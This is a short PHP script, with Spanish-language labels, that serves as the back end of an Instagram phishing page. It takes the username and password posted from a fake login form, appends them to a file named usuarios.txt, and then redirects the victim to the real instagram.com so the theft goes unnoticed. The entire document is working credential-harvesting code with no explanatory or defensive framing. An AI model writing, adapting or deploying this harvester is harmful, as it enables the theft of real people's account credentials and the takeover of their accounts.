<?php

file_put_contents("usuarios.txt", "Cuenta de Instagram: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
